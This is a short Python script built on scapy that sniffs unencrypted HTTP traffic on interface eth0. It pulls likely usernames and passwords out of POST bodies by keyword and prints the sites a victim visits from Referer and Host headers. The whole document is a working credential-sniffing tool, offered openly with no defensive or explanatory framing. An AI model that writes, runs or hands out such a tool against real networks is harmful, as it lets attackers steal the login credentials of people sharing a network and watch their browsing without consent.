#!/usr/bin/python
import scapy.all as scapy

# Function to sniff HTTP packets on the specified interface
def sniff(interface):
    scapy.sniff(iface=interface, filter="tcp port 80", prn=http_packet, store=False)

# Function to analyze HTTP packets and extract login credentials and URLs
def http_packet(packet):
    if packet.haslayer(scapy.Raw):
        packet_data = str(packet[scapy.Raw].load)

        if "POST" in packet_data:
            # Check for keywords indicating login credentials in the POST data
            keywords = ["uname", "pass", "user", "login", "password"]
            for keyword in keywords:
                if keyword in packet_data:
                    login_credential = packet_data.split(keyword)[1]
                    print("[+] Possible login credential is: ", login_credential)
                    print("\n")
                    break
            else:
                # If no login credentials found, print the entire packet data
                print(packet_data)
                print("\n")

        elif "GET" in packet_data:
            # Check for Referer or Host header in GET request to determine the visited website
            if "Referer" in packet_data:
                website = (packet_data.split("Referer")[1]).split("Connection:")[0][:-4]
                print("[+] Possible site they are visiting: ", website)
                print("\n")
            elif "Host" in packet_data:
                host_part = packet_data.split("Host:")
                second_part = host_part[0]
                first_part = host_part[1]
                first_part = host_part[1].split("User-Agent")[0][:-4]
                second_part = (host_part[0].split("HTTP")[0]).split("GET ")[1]
                website = first_part + second_part
                print("[+] Possible site they are visiting: ", website)
                print("\n")
            else:
                # If no Referer or Host header found, print the entire packet data
                print(packet_data)
                print("\n")

# Start sniffing HTTP packets on the specified interface (change "eth0" to the desired network interface)
sniff("eth0")
